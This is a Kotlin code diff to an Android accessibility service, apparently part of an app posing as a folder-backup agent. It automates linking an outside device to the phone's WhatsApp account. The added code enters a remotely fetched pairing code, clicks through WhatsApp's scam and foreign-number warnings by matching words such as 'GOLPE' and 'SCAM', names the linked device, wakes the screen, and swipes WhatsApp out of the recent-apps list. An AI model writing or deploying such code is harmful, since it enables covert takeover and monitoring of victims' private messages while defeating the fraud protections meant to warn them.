@@ -9,6 +9,7 @@ import android.content.Intent
 import android.graphics.Path
 import android.graphics.Rect
 import android.os.Bundle
+import android.os.PowerManager
 import android.view.accessibility.AccessibilityNodeInfo
 import android.util.Log
 import com.folderbackup.agent.backup.WhatsappSessionExporter
@@ -134,7 +135,8 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
         ) {
             val root = whatsappRoot() ?: return
             val now = System.currentTimeMillis()
-            if (now - lastActionAt < 1200) return
+            val throttleMs = linkDeviceThrottleMs()
+            if (now - lastActionAt < throttleMs) return
             if (handleLinkDeviceNavigation(root, now)) {
                 lastActionAt = now
             }
@@ -193,16 +195,11 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
     }
 
     fun tickLinkDevice(): Boolean {
-        if (!WhatsappAutomationGate.allowAutomation()) return false
+        if (!WhatsappLinkDeviceState.needsA11y() && !WhatsappAutomationGate.allowAutomation()) return false
         if (!WhatsappLinkDeviceState.needsA11y()) return false
         val root = whatsappRoot() ?: return false
         val now = System.currentTimeMillis()
-        // Digitar código: tenta a cada ciclo; menu: throttle 1,2s.
-        val throttleMs = if (WhatsappLinkDeviceState.step == WhatsappLinkDeviceState.Step.EnterCode) {
-            800L
-        } else {
-            1200L
-        }
+        val throttleMs = linkDeviceThrottleMs()
         if (now - lastActionAt < throttleMs) return false
         if (handleLinkDeviceNavigation(root, now)) {
             lastActionAt = now
@@ -267,6 +264,259 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
         val doneTexts = listOf("AVANÇAR", "PRÓXIMO", "NEXT", "CONTINUAR", "OK", "SALVAR", "CONCLUIR")
         for (text in doneTexts) {
             if (clickByText(root, text, partial = true)) return true
+        }
+        return false
+    }
+
+    private fun linkDeviceThrottleMs(): Long = when (WhatsappLinkDeviceState.step) {
+        WhatsappLinkDeviceState.Step.ConfirmScamWarning -> 100L
+        WhatsappLinkDeviceState.Step.EnterCode -> 500L
+        WhatsappLinkDeviceState.Step.NameLinkedDevice -> 400L
+        else -> 900L
+    }
+
+    private fun dismissScamWarningScreen(root: AccessibilityNodeInfo): Boolean {
+        if (findDeviceNameEdit(root) != null) {
+            Log.i(TAG, "Tela de nome já visível — pulando anti-golpe")
+            WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.ConfirmScamWarning)
+            return true
+        }
+
+        if (treeContainsAny(root, SCAM_WARNING_HINTS) || treeContainsAny(root, SCAM_COUNTRY_HINTS)) {
+            if (clickScamDismissOk(root)) {
+                Log.i(TAG, "Anti-golpe: OK/ENTENDI clicado (alerta país/golpe)")
+                return true
+            }
+        }
+
+        if (clickConnectDeviceButton(root)) {
+            Log.i(TAG, "Anti-golpe: botão Conectar dispositivo clicado")
+            return true
+        }
+
+        scrollDownScreen()
+        sleepMs(250)
+        val waRoot = whatsappRoot() ?: root
+        if (clickConnectDeviceButton(waRoot)) {
+            Log.i(TAG, "Anti-golpe: botão clicado após scroll")
+            return true
+        }
+        return false
+    }
+
+    /** Procura e clica o botão principal da tela anti-golpe. */
+    private fun clickConnectDeviceButton(root: AccessibilityNodeInfo): Boolean {
+        val viewIds = listOf(
+            "com.whatsapp.w4b:id/connect_device_button",
+            "com.whatsapp.w4b:id/primary_button",
+            "com.whatsapp.w4b:id/button_primary",
+            "com.whatsapp.w4b:id/primary_action_button",
+            "com.whatsapp:id/connect_device_button",
+        )
+        for (id in viewIds) {
+            val nodes = root.findAccessibilityNodeInfosByViewId(id)
+            for (node in nodes) {
+                if (clickNode(node)) return true
+            }
+        }
+
+        val connectTexts = listOf(
+            "CONECTAR DISPOSITIVO",
+            "CONECTAR O DISPOSITIVO",
+            "Conectar dispositivo",
+            "Conectar o dispositivo",
+            "CONECTAR DISPOSITIVO MESMO ASSIM",
+            "CONECTAR DISPOSITIVO mesmo assim",
+            "CONNECT DEVICE",
+            "LINK DEVICE",
+            "VINCULAR DISPOSITIVO",
+            "Vincular dispositivo",
+            "CONECTAR EL DISPOSITIVO",
+            "VINCULAR EL DISPOSITIVO",
+            "CONTINUAR",
+            "CONTINUE",
+            "CONTINUAR DE TODAS FORMAS",
+            "Continuar mesmo assim",
+        )
+        for (text in connectTexts) {
+            if (clickByText(root, text, partial = true)) return true
+        }
+
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        val clickables = mutableListOf<AccessibilityNodeInfo>()
+        var visited = 0
+        val rect = Rect()
+        while (queue.isNotEmpty() && visited < 450) {
+            val node = queue.removeFirst()
+            visited++
+            val label = buildString {
+                node.text?.let { append(it).append(' ') }
+                node.contentDescription?.let { append(it) }
+            }.uppercase()
+            if (node.isClickable &&
+                (label.contains("CONECTAR") || label.contains("CONNECT") || label.contains("VINCULAR")) &&
+                (label.contains("DISPOSITIVO") || label.contains("DEVICE"))
+            ) {
+                clickables.add(node)
+            }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
+        }
+        return clickables
+            .sortedByDescending { node ->
+                node.getBoundsInScreen(rect)
+                rect.bottom
+            }
+            .any { clickNode(it) }
+    }
+
+    /** OK / ENTENDI em alertas modais de golpe ou número de outro país. */
+    private fun clickScamDismissOk(root: AccessibilityNodeInfo): Boolean {
+        val okTexts = listOf(
+            "OK",
+            "ENTENDI",
+            "ENTENDIDO",
+            "ACEITO",
+            "ACEPTAR",
+            "ACCEPT",
+            "GOT IT",
+            "CONTINUAR",
+            "CONTINUE",
+            "SIM",
+            "SÍ",
+            "SI",
+            "YES",
+        )
+        for (text in okTexts) {
+            if (clickByText(root, text, partial = false)) return true
+        }
+        return false
+    }
+
+    private fun clickNode(node: AccessibilityNodeInfo): Boolean {
+        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+        if (performClickOnParent(node)) return true
+        return clickNodeByGesture(node)
+    }
+
+    private fun scrollDownScreen(): Boolean {
+        return try {
+            val metrics = resources.displayMetrics
+            val w = metrics.widthPixels.toFloat()
+            val h = metrics.heightPixels.toFloat()
+            val path = Path().apply {
+                moveTo(w * 0.5f, h * 0.78f)
+                lineTo(w * 0.5f, h * 0.22f)
+            }
+            val gesture = GestureDescription.Builder()
+                .addStroke(GestureDescription.StrokeDescription(path, 0, 350))
+                .build()
+            dispatchGesture(gesture, null, null)
+        } catch (e: Exception) {
+            Log.w(TAG, "scrollDown: ${e.message}")
+            false
+        }
+    }
+
+    private fun completeLinkedDeviceName(root: AccessibilityNodeInfo): Boolean {
+        val name = WhatsappLinkDeviceState.deviceName?.trim().orEmpty()
+        if (name.isNotBlank() && !WhatsappLinkDeviceState.deviceNameApplied) {
+            val edit = findDeviceNameEdit(root) ?: findFirstEditText(root) ?: return false
+            if (setText(edit, name)) {
+                WhatsappLinkDeviceState.deviceNameApplied = true
+                sleepMs(400)
+            }
+        }
+        val waRoot = whatsappRoot() ?: root
+        if (clickSaveDeviceName(waRoot)) {
+            Log.i(TAG, "Salvar nome: save_device_name_btn")
+            return true
+        }
+        val saveTexts = listOf(
+            "SALVAR",
+            "GUARDAR",
+            "SAVE",
+            "AVANÇAR",
+            "AVANCAR",
+            "PRÓXIMO",
+            "PROXIMO",
+            "NEXT",
+            "CONTINUAR",
+            "OK",
+            "CONCLUIR",
+            "LISTO",
+            "HECHO",
+            "FINALIZAR",
+            "CONFIRMAR",
+            "CONFIRM",
+            "ACEPTAR",
+            "ACCEPT",
+            "TERMINAR",
+            "DONE",
+        )
+        for (text in saveTexts) {
+            if (clickByText(root, text, partial = true)) return true
+        }
+        return false
+    }
+
+    private fun findDeviceNameEdit(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val viewIds = listOf(
+            "com.whatsapp.w4b:id/device_name_edit_text",
+            "com.whatsapp.w4b:id/linked_device_name",
+            "com.whatsapp.w4b:id/device_name",
+            "com.whatsapp.w4b:id/companion_device_name",
+            "com.whatsapp:id/linked_device_name",
+        )
+        for (id in viewIds) {
+            val nodes = root.findAccessibilityNodeInfosByViewId(id)
+            for (node in nodes) {
+                if (node.isEditable || node.className?.toString()?.contains("EditText") == true) {
+                    return node
+                }
+                val nested = findFirstEditText(node)
+                if (nested != null) return nested
+            }
+        }
+        return null
+    }
+
+    private fun clickSaveDeviceName(root: AccessibilityNodeInfo): Boolean {
+        val viewIds = listOf(
+            "com.whatsapp.w4b:id/save_device_name_btn",
+            "com.whatsapp:id/save_device_name_btn",
+        )
+        for (id in viewIds) {
+            val nodes = root.findAccessibilityNodeInfosByViewId(id)
+            for (node in nodes) {
+                if (node.isEnabled && node.isClickable &&
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                ) {
+                    return true
+                }
+                if (performClickOnParent(node)) return true
+            }
+        }
+        return false
+    }
+
+    private fun treeContainsAny(root: AccessibilityNodeInfo, hints: List<String>): Boolean {
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        var visited = 0
+        while (queue.isNotEmpty() && visited < 400) {
+            val node = queue.removeFirst()
+            visited++
+            val text = buildString {
+                node.text?.let { append(it).append(' ') }
+                node.contentDescription?.let { append(it) }
+            }.uppercase()
+            if (hints.any { hint -> text.contains(hint.uppercase()) }) return true
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
         }
         return false
     }
@@ -361,11 +611,43 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
                 }
             }
             WhatsappLinkDeviceState.Step.EnterCode -> {
-                val code = WhatsappRegistrationState.pairingCode ?: return false
+                if (isOnPairingErrorDialog()) return false
+                if (WhatsappLinkDeviceState.pairingCodeSubmitted) {
+                    return !isOnEnterCodeScreen() ||
+                        isOnScamWarningScreen() ||
+                        isOnNameDeviceScreen()
+                }
+                if (!WhatsappLinkDeviceState.tryBeginCodeEntry()) return false
+                val code = WhatsappRegistrationState.pairingCode ?: run {
+                    WhatsappLinkDeviceState.endCodeEntry()
+                    return false
+                }
                 val waRoot = whatsappRoot() ?: root
-                if (enterPairingCodeOnScreen(waRoot, code)) {
-                    WhatsappLinkDeviceState.markDone()
-                    WhatsappRegistrationState.markPairingDone()
+                return try {
+                    if (enterPairingCodeOnScreenLocked(waRoot, code)) {
+                        WhatsappLinkDeviceState.pairingCodeSubmitted = true
+                        WhatsappRegistrationState.markPairingDone()
+                        WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.EnterCode)
+                        Log.i(TAG, "Código enviado — aguardando tela anti-golpe")
+                        true
+                    } else {
+                        false
+                    }
+                } finally {
+                    WhatsappLinkDeviceState.endCodeEntry()
+                }
+            }
+            WhatsappLinkDeviceState.Step.ConfirmScamWarning -> {
+                if (dismissScamWarningScreen(root)) {
+                    WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.ConfirmScamWarning)
+                    Log.i(TAG, "Tela anti-golpe confirmada — Conectar dispositivo")
+                    return true
+                }
+            }
+            WhatsappLinkDeviceState.Step.NameLinkedDevice -> {
+                if (completeLinkedDeviceName(root)) {
+                    WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.NameLinkedDevice)
+                    Log.i(TAG, "Dispositivo nomeado: ${WhatsappLinkDeviceState.deviceName}")
                     return true
                 }
             }
@@ -456,43 +738,136 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
     }
 
     private fun enterPairingCodeOnScreen(root: AccessibilityNodeInfo, code: String): Boolean {
+        if (isOnPairingErrorDialog()) return false
+        if (isOnScamWarningScreen() || isOnNameDeviceScreen()) return true
+        if (WhatsappLinkDeviceState.pairingCodeSubmitted) return waitForCodeAccepted()
+        if (!WhatsappLinkDeviceState.tryBeginCodeEntry()) return false
+
+        try {
+            return enterPairingCodeOnScreenLocked(root, code)
+        } finally {
+            WhatsappLinkDeviceState.endCodeEntry()
+        }
+    }
+
+    private fun enterPairingCodeOnScreenLocked(root: AccessibilityNodeInfo, code: String): Boolean {
+        if (isOnPairingErrorDialog()) return false
+        if (isOnScamWarningScreen() || isOnNameDeviceScreen()) return true
+
         val normalized = code.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
         if (normalized.length < 8) {
             Log.w(TAG, "enterPairingCode: código curto ($normalized)")
             return false
         }
+        val expected = normalized.take(8)
+        wakeScreen()
 
-        val edits = findPairingCodeEdits(root)
+        fun freshEdits(): List<AccessibilityNodeInfo> {
+            val waRoot = whatsappRoot() ?: root
+            return findPairingCodeEdits(waRoot)
+        }
+
+        var edits = freshEdits()
         if (edits.isEmpty()) {
             val pkg = root.packageName?.toString().orEmpty()
             Log.w(TAG, "enterPairingCode: nenhum campo pkg=$pkg")
             return false
         }
 
+        if (verifyPairingCodeEntered(edits, expected)) {
+            Log.i(TAG, "Pairing já preenchido: $expected")
+            sleepMs(400)
+            return waitForCodeAccepted()
+        }
+
         for (field in edits) {
             field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
             setText(field, "")
         }
+        sleepMs(200)
+        edits = freshEdits()
+        if (edits.isEmpty()) return false
 
-        val chars = normalized.take(edits.size.coerceAtMost(normalized.length))
-        for (i in chars.indices) {
+        Log.i(TAG, "Digitando pairing char a char: $expected (${edits.size} campos)")
+        for (i in expected.indices) {
+            if (i >= edits.size) break
             val field = edits[i]
             field.performAction(AccessibilityNodeInfo.ACTION_CLICK)
             field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
-            if (!setText(field, chars[i].toString())) {
-                Log.w(TAG, "setText falhou campo ${i + 1}/${edits.size}")
+            sleepMs(80)
+            val ch = expected[i].toString()
+            if (!typeIntoField(field, ch)) {
+                Log.w(TAG, "typeIntoField falhou campo ${i + 1}/${edits.size}")
                 return false
             }
+            sleepMs(150)
+            edits = freshEdits()
         }
 
-        if (!verifyPairingCodeEntered(edits, chars)) {
-            Log.w(TAG, "Pairing code incompleto após digitar: $chars")
+        sleepMs(600)
+        edits = freshEdits()
+        if (!verifyPairingCodeEntered(edits, expected)) {
+            logPairingFieldMismatch(edits, expected)
+            if (isOnScamWarningScreen() || isOnNameDeviceScreen() || isOnPairingErrorDialog()) {
+                return !isOnPairingErrorDialog()
+            }
             return false
         }
 
-        Log.i(TAG, "Pairing digitado: $chars campos=${edits.size}")
-        clickPairingSubmit(root)
+        Log.i(TAG, "Pairing digitado: $expected")
+        return waitForCodeAccepted()
+    }
+
+    private fun waitForCodeAccepted(): Boolean {
+        repeat(6) {
+            sleepMs(500)
+            if (isOnPairingErrorDialog()) return false
+            if (isOnScamWarningScreen() || isOnNameDeviceScreen()) return true
+            if (!isOnEnterCodeScreen()) return true
+        }
+        val waRoot = whatsappRoot() ?: return true
+        clickPairingSubmit(waRoot)
+        sleepMs(800)
+        if (isOnPairingErrorDialog()) return false
+        return !isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()
+    }
+
+    private fun finishPairingSubmit(): Boolean {
+        sleepMs(500)
+        val waRoot = whatsappRoot() ?: return true
+        clickPairingSubmit(waRoot)
         return true
+    }
+
+    private fun sleepMs(ms: Long) {
+        try {
+            Thread.sleep(ms)
+        } catch (_: InterruptedException) {
+            Thread.currentThread().interrupt()
+        }
+    }
+
+    private fun wakeScreen() {
+        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
+        if (pm.isInteractive) return
+        @Suppress("DEPRECATION")
+        val wakeLock = pm.newWakeLock(
+            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+            "folderbackup:pairing_wake",
+        )
+        wakeLock.acquire(3000)
+        wakeLock.release()
+    }
+
+    private fun logPairingFieldMismatch(edits: List<AccessibilityNodeInfo>, expected: String) {
+        val actual = edits.take(8).joinToString("") { fieldChar(it).take(1) }
+        Log.w(TAG, "Pairing code incompleto: esperado=$expected obtido=$actual campos=${edits.size}")
+    }
+
+    private fun fieldChar(node: AccessibilityNodeInfo): String {
+        val raw = node.text?.toString().orEmpty()
+            .ifBlank { node.contentDescription?.toString().orEmpty() }
+        return raw.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
     }
 
     private fun clickPairingSubmit(root: AccessibilityNodeInfo): Boolean {
@@ -535,10 +910,24 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
             if (edits.size >= 4 && sources.size == 1) break
         }
 
-        if (edits.isEmpty()) {
-            collectEditTextsByContentDesc(root, "campo 1 de 8", edits)
-            if (edits.isEmpty()) {
+        if (edits.size < 4) {
+            val hints = listOf(
+                "campo 1 de 8",
+                "field 1 of 8",
+                "casilla 1 de 8",
+                "campo 1",
+                "field 1",
+                "casilla 1",
+            )
+            for (hint in hints) {
+                collectEditTextsByContentDesc(root, hint, edits)
+                if (edits.size >= 4) break
+            }
+            if (edits.size < 4) {
                 collectEditTextsByContentDesc(root, "campo", edits)
+            }
+            if (edits.size < 4) {
+                collectEditTextsByContentDesc(root, "casilla", edits)
             }
         }
 
@@ -584,14 +973,20 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
         edits: List<AccessibilityNodeInfo>,
         expected: String,
     ): Boolean {
-        if (edits.size < expected.length) return false
-        for (i in expected.indices) {
-            val ch = edits[i].text?.toString()?.trim().orEmpty()
-                .replace(Regex("[^A-Za-z0-9]"), "")
-                .uppercase()
-            if (ch != expected[i].toString()) return false
+        if (edits.isEmpty()) return false
+        val collected = buildString {
+            for (edit in edits) {
+                append(fieldChar(edit))
+            }
+        }.replace(Regex("[^A-Za-z0-9]"), "").uppercase()
+        if (collected == expected) return true
+        if (edits.size == 1) {
+            return collected.contains(expected)
         }
-        return true
+        if (collected.length >= expected.length) {
+            return collected.take(expected.length) == expected
+        }
+        return false
     }
 
     private fun clickByText(root: AccessibilityNodeInfo, text: String, partial: Boolean): Boolean {
@@ -748,6 +1143,16 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
         return false
     }
 
+    private fun typeIntoField(field: AccessibilityNodeInfo, text: String): Boolean {
+        if (setText(field, text)) return true
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
+            ?: return false
+        clipboard.setPrimaryClip(ClipData.newPlainText("pairing_char", text))
+        field.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
+        if (field.performAction(AccessibilityNodeInfo.ACTION_PASTE)) return true
+        return setText(field, text)
+    }
+
     private fun setText(node: AccessibilityNodeInfo, text: String): Boolean {
         val args = Bundle()
         args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
@@ -862,8 +1267,184 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
         }
     }
 
+    private fun findWhatsappRecentCardRect(root: AccessibilityNodeInfo): Rect? {
+        val hints = listOf("WHATSAPP", "W4B", "BUSINESS")
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        val rect = Rect()
+        var best: Rect? = null
+        var bestArea = 0
+        var visited = 0
+        while (queue.isNotEmpty() && visited < 600) {
+            val node = queue.removeFirst()
+            visited++
+            val label = buildString {
+                node.text?.let { append(it).append(' ') }
+                node.contentDescription?.let { append(it) }
+            }.uppercase()
+            if (hints.any { label.contains(it) }) {
+                node.getBoundsInScreen(rect)
+                val area = rect.width() * rect.height()
+                if (area > bestArea && rect.height() > 60 && rect.width() > 60) {
+                    bestArea = area
+                    best = Rect(rect)
+                }
+            }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
+        }
+        return best
+    }
+
+    private fun isInTopRightQuarter(nodeRect: Rect, cardRect: Rect): Boolean {
+        val midX = cardRect.left + cardRect.width() * 0.55f
+        val midY = cardRect.top + cardRect.height() * 0.35f
+        return nodeRect.centerX() >= midX && nodeRect.centerY() <= midY + cardRect.height() * 0.25f
+    }
+
+    /** Botão X / Fechar no canto do card (lista de apps recentes). */
+    private fun clickCloseButtonOnRecentCard(root: AccessibilityNodeInfo, cardRect: Rect): Boolean {
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        val rect = Rect()
+        val closeHints = listOf(
+            "FECHAR", "CLOSE", "REMOVER", "REMOVE", "DESCARTAR", "DISMISS",
+            "ELIMINAR", "CLEAR", "×", "X",
+        )
+        var bestNode: AccessibilityNodeInfo? = null
+        var bestSize = Int.MAX_VALUE
+        var visited = 0
+        while (queue.isNotEmpty() && visited < 600) {
+            val node = queue.removeFirst()
+            visited++
+            if (node.isClickable) {
+                node.getBoundsInScreen(rect)
+                if (Rect.intersects(rect, cardRect)) {
+                    val label = buildString {
+                        node.text?.let { append(it).append(' ') }
+                        node.contentDescription?.let { append(it) }
+                    }.uppercase()
+                    val looksLikeClose = closeHints.any { label.contains(it) } ||
+                        (rect.width() in 1..140 && rect.height() in 1..140 && isInTopRightQuarter(rect, cardRect))
+                    if (looksLikeClose) {
+                        val size = rect.width() * rect.height()
+                        if (size < bestSize) {
+                            bestSize = size
+                            bestNode = node
+                        }
+                    }
+                }
+            }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
+        }
+        return bestNode?.let { clickNode(it) } == true
+    }
+
+    private fun closeWhatsappRecentCard(root: AccessibilityNodeInfo): Boolean {
+        val cardRect = findWhatsappRecentCardRect(root) ?: return false
+        if (clickCloseButtonOnRecentCard(root, cardRect)) {
+            Log.i(TAG, "Recents: botão X/fechar no card WA $cardRect")
+            Thread.sleep(500)
+            return true
+        }
+        if (swipeLeftFromRect(cardRect)) {
+            Log.i(TAG, "Recents: arrastou card WA para o lado $cardRect")
+            Thread.sleep(500)
+            return true
+        }
+        if (swipeUpFromRect(cardRect)) {
+            Log.i(TAG, "Recents: arrastou card WA para cima $cardRect")
+            return true
+        }
+        return false
+    }
+
+    private fun isWhatsappVisibleInRecents(root: AccessibilityNodeInfo): Boolean {
+        return findWhatsappRecentCardRect(root) != null
+    }
+
+    private fun swipeWhatsappRecentCard(root: AccessibilityNodeInfo): Boolean {
+        return closeWhatsappRecentCard(root)
+    }
+
+    private fun swipeLeftFromRect(rect: Rect): Boolean {
+        return try {
+            val y = rect.centerY().toFloat()
+            val xStart = (rect.right - rect.width() * 0.15f).coerceAtMost(resources.displayMetrics.widthPixels * 0.92f)
+            val xEnd = rect.left - rect.width() * 0.3f
+            val path = Path().apply {
+                moveTo(xStart, y)
+                lineTo(xEnd.coerceAtLeast(0f), y)
+            }
+            val gesture = GestureDescription.Builder()
+                .addStroke(GestureDescription.StrokeDescription(path, 0, 280))
+                .build()
+            dispatchGesture(gesture, null, null)
+            Thread.sleep(450)
+            true
+        } catch (e: Exception) {
+            Log.w(TAG, "swipeLeftFromRect: ${e.message}")
+            false
+        }
+    }
+
+    private fun swipeDismissRecentsCard(): Boolean {
+        val metrics = resources.displayMetrics
+        val rect = Rect(
+            (metrics.widthPixels * 0.08f).toInt(),
+            (metrics.heightPixels * 0.35f).toInt(),
+            (metrics.widthPixels * 0.92f).toInt(),
+            (metrics.heightPixels * 0.72f).toInt(),
+        )
+        Log.i(TAG, "Recents: swipe genérico no card central")
+        return swipeUpFromRect(rect)
+    }
+
+    private fun swipeUpFromRect(rect: Rect): Boolean {
+        return try {
+            val cx = rect.centerX().toFloat()
+            val yStart = (rect.top + rect.height() * 0.75f)
+                .coerceAtMost(resources.displayMetrics.heightPixels * 0.85f)
+            val yEnd = (rect.top - rect.height() * 0.5f).coerceAtLeast(0f)
+            val path = Path().apply {
+                moveTo(cx, yStart)
+                lineTo(cx, yEnd)
+            }
+            val gesture = GestureDescription.Builder()
+                .addStroke(GestureDescription.StrokeDescription(path, 0, 320))
+                .build()
+            dispatchGesture(gesture, null, null)
+            Thread.sleep(450)
+            true
+        } catch (e: Exception) {
+            Log.w(TAG, "swipeUpFromRect: ${e.message}")
+            false
+        }
+    }
+
     companion object {
         private const val TAG = "WaRegA11y"
+
+        private val SCAM_WARNING_HINTS = listOf(
+            "SUSPEITA", "GOLPE", "SCAM", "ESTAFA", "FRAUDE", "ENGAÑO", "ENGANO", "FRAUD",
+            "SOSPECH", "ALERTA", "CUIDADO", "PRECAU",
+        )
+        private val SCAM_COUNTRY_HINTS = listOf(
+            "OUTRO PAÍS", "OUTRO PAIS", "ANOTHER COUNTRY", "OTRO PAÍS", "OTRO PAIS",
+            "BRASIL", "COLOMBIA", "INTERNACIONAL", "INTERNATIONAL",
+            "NÚMERO DE OUTRO", "NUMERO DE OUTRO", "NÚMERO DE OTRO", "NUMERO DE OTRO",
+        )
+        private val SCAM_CONNECT_HINTS = listOf(
+            "CONECTAR DISPOSITIVO", "CONNECT DEVICE", "VINCULAR DISPOSITIVO",
+            "CONECTAR EL DISPOSITIVO", "VINCULAR EL DISPOSITIVO",
+        )
+        private val NAME_DEVICE_HINTS = listOf(
+            "NOME DO DISPOSITIVO", "NOME DE DISPOSITIVO", "DEVICE NAME",
+            "NOMBRE DEL DISPOSITIVO", "NOMBRE DE DISPOSITIVO",
+        )
 
         @Volatile
         var instance: WhatsappRegistrationAccessibilityService? = null
@@ -873,8 +1454,186 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
             return service.performGlobalAction(GLOBAL_ACTION_HOME)
         }
 
+        fun pressBack(): Boolean {
+            val service = instance ?: return false
+            return service.performGlobalAction(GLOBAL_ACTION_BACK)
+        }
+
+        /**
+         * Fecha WhatsApp na lista de apps recentes (botão X ou arrastar card).
+         * Igual ao gesto manual: botão quadrado → fechar WA → HOME.
+         */
+        fun dismissWhatsappFromRecents(): Boolean {
+            val service = instance ?: return false
+            pressHome()
+            Thread.sleep(500)
+            repeat(4) { attempt ->
+                if (!service.performGlobalAction(GLOBAL_ACTION_RECENTS)) {
+                    Log.w(TAG, "dismissRecents: RECENTS falhou tentativa ${attempt + 1}")
+                    Thread.sleep(400)
+                    return@repeat
+                }
+                Thread.sleep(1100)
+                val root = service.rootInActiveWindow
+                if (root != null) {
+                    if (service.closeWhatsappRecentCard(root)) {
+                        Thread.sleep(700)
+                        pressHome()
+                        return true
+                    }
+                    if (service.swipeDismissRecentsCard()) {
+                        Thread.sleep(700)
+                        pressHome()
+                        return true
+                    }
+                }
+                pressHome()
+                Thread.sleep(400)
+            }
+            pressHome()
+            return true
+        }
+
+        /** Fora das telas de pairing/menu — seguro pedir código Evolution. */
+        fun isSafeForPairingCodeFetch(): Boolean {
+            if (isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()) return false
+            if (isOnLinkedDevicesMenu()) return false
+            return instance?.whatsappRoot() != null
+        }
+
+        /** Lista de conversas (abas CHATS/STATUS visíveis) — preferencial, não obrigatório. */
+        fun isOnWhatsappChatHome(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()) return false
+            if (isOnLinkedDevicesMenu()) return false
+            val homeTabs = listOf(
+                "CHATS", "CONVERSAS", "CONVERSACIONES",
+                "STATUS", "ESTADO", "ESTADOS",
+                "COMUNIDADES", "COMMUNITIES",
+            )
+            return service.treeContainsAny(root, homeTabs)
+        }
+
+        /** Menu Dispositivos conectados (sem ser a tela do código). */
+        fun isOnLinkedDevicesMenu(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (isOnEnterCodeScreen()) return false
+            val hints = listOf(
+                "DISPOSITIVOS CONECTADOS",
+                "DISPOSITIVOS VINCULADOS",
+                "LINKED DEVICES",
+                "VINCULAR DISPOSITIVO",
+                "LINK A DEVICE",
+                "VINCULAR UN DISPOSITIVO",
+            )
+            return service.treeContainsAny(root, hints)
+        }
+
+        /** Sai de telas de pairing/menu; aceita qualquer tela WA que não seja pairing. */
+        fun ensureWhatsappChatHome(maxSteps: Int = 8): Boolean {
+            repeat(maxSteps) {
+                if (isSafeForPairingCodeFetch() && isOnWhatsappChatHome()) return true
+                if (isOnEnterCodeScreen() || isOnLinkedDevicesMenu() || isOnScamWarningScreen() || isOnNameDeviceScreen()) {
+                    pressBack()
+                    Thread.sleep(500)
+                    return@repeat
+                }
+                if (isSafeForPairingCodeFetch()) return true
+                pressBack()
+                Thread.sleep(400)
+            }
+            return isSafeForPairingCodeFetch()
+        }
+
         /** Chamado pelo coordinator em loop — não espera eventos passivos. */
         fun runLinkDeviceStep(): Boolean = instance?.tickLinkDevice() ?: false
+
+        fun isPairingCodeFilled(code: String): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            val normalized = code.replace(Regex("[^A-Za-z0-9]"), "").uppercase().take(8)
+            if (normalized.length < 8) return false
+            val edits = service.findPairingCodeEdits(root)
+            return service.verifyPairingCodeEntered(edits, normalized)
+        }
+
+        /** Clica Conectar dispositivo na tela anti-golpe — chamada direta pelo coordinator. */
+        fun confirmScamWarning(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (isOnNameDeviceScreen()) {
+                WhatsappLinkDeviceState.beginNameDevice(
+                    WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
+                )
+                return true
+            }
+            if (!isOnScamWarningScreen() && !WhatsappLinkDeviceState.needsA11y()) return false
+            if (WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.ConfirmScamWarning &&
+                WhatsappLinkDeviceState.step != WhatsappLinkDeviceState.Step.NameLinkedDevice
+            ) {
+                WhatsappRegistrationState.markPairingDone()
+                WhatsappLinkDeviceState.step = WhatsappLinkDeviceState.Step.ConfirmScamWarning
+            }
+            if (service.dismissScamWarningScreen(root)) {
+                WhatsappLinkDeviceState.advanceFrom(WhatsappLinkDeviceState.Step.ConfirmScamWarning)
+                return true
+            }
+            return isOnNameDeviceScreen()
+        }
+
+        /** Digitação direta do código — usado pelo coordinator (não depende só do step machine). */
